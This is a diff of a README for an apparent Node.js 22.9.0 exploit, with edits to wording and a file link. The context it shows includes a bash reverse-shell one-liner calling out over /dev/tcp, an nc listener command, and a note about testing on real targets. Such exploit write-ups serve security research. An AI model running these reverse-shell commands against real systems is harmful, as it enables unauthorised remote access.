@@ -8,7 +8,7 @@ Because `node` is often compiled without PIE (Position Independent Executable), 
 
 ## Running
 
-This exploit was specifically made for the latest version of node as of writing, **version 22.9.0**. Almost any other version will have different addresses and memory, resulting in a **crash**. Using GDB, the exploit script needs to be tweaked in this case.
+This exploit was specifically made for the latest version of node as of writing, **version 22.9.0**. Almost any other version will have different addresses and memory, resulting in a **crash**. Using GDB, the exploit script needs to be tweaked in that case.
 
 > [!WARNING]  
 > Any exploit attempt will crash the server, also after exiting the reverse shell. Keep this in mind while testing on real targets.
@@ -28,7 +28,7 @@ bash -c 'bash -i >& /dev/tcp/host.docker.internal/1337 0>&1'
 $ python3 -m http.server 1338
 ```
 
-3. In case of a reverse shell in `http/index.html`, set up a listener
+3. In case of a reverse shell in [`exploit/index.html`](exploit/index.html), set up a listener
 
 ```sh
 nc -lnvp 1337
